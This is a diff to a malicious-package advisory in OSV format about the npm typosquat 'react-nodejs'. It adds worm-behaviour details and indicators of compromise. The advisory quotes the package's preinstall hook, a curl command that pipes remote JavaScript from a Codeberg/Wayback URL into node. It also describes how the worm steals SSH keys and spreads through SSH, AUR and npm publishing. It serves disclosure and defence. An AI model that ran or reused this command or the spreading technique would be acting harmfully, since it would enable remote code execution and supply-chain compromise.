@@ -2,9 +2,9 @@
   "schema_version": "1.7.4",
   "id": "MAL-2026-17294",
   "published": "2026-09-29T07:12:49Z",
-  "modified": "2026-10-01T05:19:20.329327331Z",
+  "modified": "2026-10-01T08:00:00Z",
   "summary": "Malicious code in react-nodejs (npm)",
-  "details": "The package react-nodejs impersonates the legitimate 'react' package (it republishes react's package metadata and code) and adds a malicious preinstall hook that runs automatically on npm install, before any dependency is installed: `curl https://web.archive.org/web/https://codeberg.org/hellscripter/install-scripts/raw/branch/main/node.js | node`. The hook downloads a remote JavaScript second stage from a Wayback Machine mirror of a Codeberg repository (hellscripter/install-scripts) and pipes it directly into node, giving the attacker arbitrary code execution on the installing machine. Version 19.3.0 was published on 2026-09-29. It is one of nine packages published within about 33 minutes by the npm account 'dirtyblanket' (maintainer email s7dwzxru4z@ooynib.com), all carrying the identical preinstall hook: xeprews, express-javascript, express-nodejs, react-nodejs, exprdd, exprrdd, exptrdd, exptred, exptredd.\n\n---\n_-= Per source details. Do not edit below this line.=-_\n\n## Source: amazon-inspector (5777ca86863da9fabb9da8e1a0d6c2f30f05533265624b2da07a8d0804930481)\npackage.json declares a preinstall lifecycle hook that runs `curl https://web.archive.org/web/https://codeberg.org/hellscripter/install-scripts/raw/branch/main/node.js | node`, fetching a JavaScript file from an unrelated third-party Codeberg user's repository on a mutable branch (proxied through web.archive.org) and executing it in Node on the installer's machine at `npm install` time. The fetched content is unpinned, unverified, and controlled by an account with no relationship to the React publisher. The package additionally impersonates React: name `react-nodejs`, description copied from React, `homepage` set to https://react.dev/, and `repository` pointing at github.com/react/react.git, while being published by an unrelated author — a typosquat lure amplifying the install-time remote code execution.\n",
+  "details": "The package react-nodejs impersonates the legitimate 'react' package (it republishes react's package metadata and code) and adds a malicious preinstall hook that runs automatically on npm install, before any dependency is installed: `curl https://web.archive.org/web/https://codeberg.org/hellscripter/install-scripts/raw/branch/main/node.js | node`. The hook downloads a remote JavaScript second stage from a Wayback Machine mirror of a Codeberg repository (hellscripter/install-scripts) and pipes it directly into node, giving the attacker arbitrary code execution on the installing machine. Version 19.3.0 was published on 2026-09-29. It is one of nine packages published within about 33 minutes by the npm account 'dirtyblanket' (maintainer email s7dwzxru4z@ooynib.com), all carrying the identical preinstall hook: xeprews, express-javascript, express-nodejs, react-nodejs, exprdd, exprrdd, exptrdd, exptred, exptredd.\n\nOn Linux, node.js pipes linux.sh from the same Codeberg repository into bash. linux.sh (SHA-256 65f0a95b24e30305146346cbc2452cfabadab9e1ca35053e1134b67c38919577) is a worm. It installs a Go binary, systemd-fontd, as a systemd service named \"Font Rendering Service\" that proxies through Tor. SafeDep has not yet analyzed that binary. The script collects SSH private keys and known_hosts files, then connects to the known hosts over SSH and runs linux.sh on them. With the same keys, it pushes a linux.sh loader into the .install file of Arch User Repository (AUR) packages that the key owner maintains. For each package.json on disk, it adds the same preinstall script, runs npm version patch, and runs npm publish with each .npmrc it finds.\n---\n_-= Per source details. Do not edit below this line.=-_\n\n## Source: amazon-inspector (5777ca86863da9fabb9da8e1a0d6c2f30f05533265624b2da07a8d0804930481)\npackage.json declares a preinstall lifecycle hook that runs `curl https://web.archive.org/web/https://codeberg.org/hellscripter/install-scripts/raw/branch/main/node.js | node`, fetching a JavaScript file from an unrelated third-party Codeberg user's repository on a mutable branch (proxied through web.archive.org) and executing it in Node on the installer's machine at `npm install` time. The fetched content is unpinned, unverified, and controlled by an account with no relationship to the React publisher. The package additionally impersonates React: name `react-nodejs`, description copied from React, `homepage` set to https://react.dev/, and `repository` pointing at github.com/react/react.git, while being published by an unrelated author — a typosquat lure amplifying the install-time remote code execution.\n",
   "affected": [
     {
       "package": {
@@ -51,13 +51,49 @@
     {
       "type": "PACKAGE",
       "url": "https://www.npmjs.com/package/react-nodejs"
+    },
+    {
+      "type": "REPORT",
+      "url": "https://safedep.io/dirtyblanket-express-impersonation-npm/"
     }
   ],
   "database_specific": {
     "iocs": {
       "urls": [
         "https://web.archive.org/web/https://codeberg.org/hellscripter/install-scripts/raw/branch/main/node.js",
-        "https://codeberg.org/hellscripter/install-scripts/raw/branch/main/node.js"
+        "https://codeberg.org/hellscripter/install-scripts/raw/branch/main/node.js",
+        "https://codeberg.org/hellscripter/install-scripts/raw/branch/main/linux.sh",
+        "https://web.archive.org/web/https://codeberg.org/hellscripter/install-scripts/raw/branch/main/systemd-fontd"
+      ],
+      "files": [
+        {
+          "source": "PACKAGE_ARCHIVE",
+          "paths": [
+            "package.json"
+          ],
+          "note": "preinstall script pipes the web.archive.org copy of node.js into node."
+        },
+        {
+          "source": "IN_MEMORY",
+          "paths": [
+            "linux.sh"
+          ],
+          "digests": {
+            "sha256": "65f0a95b24e30305146346cbc2452cfabadab9e1ca35053e1134b67c38919577"
+          },
+          "note": "Stage two Bash worm, piped from curl into bash."
+        },
+        {
+          "source": "DROPPED",
+          "paths": [
+            "/usr/lib/systemd/systemd-fontrenderd",
+            "~/.config/systemd/systemd-fontcached"
+          ],
+          "digests": {
+            "sha256": "2c9dbc14809f1e1aebda114194368b002acf74c8760b88fc101f625d179793c2"
+          },
+          "note": "systemd-fontd, a stripped Go ELF x86-64 binary run as the \"Font Rendering Service\" systemd service. First path as root, second path without root."
+        }
       ]
     },
     "malicious-packages-origins": [
@@ -84,6 +120,13 @@
     {
       "name": "Pranesh, InvisiRisk",
       "type": "FINDER"
+    },
+    {
+      "name": "SafeDep",
+      "type": "FINDER",
+      "contact": [
+        "https://safedep.io"
+      ]
     }
   ]
 }
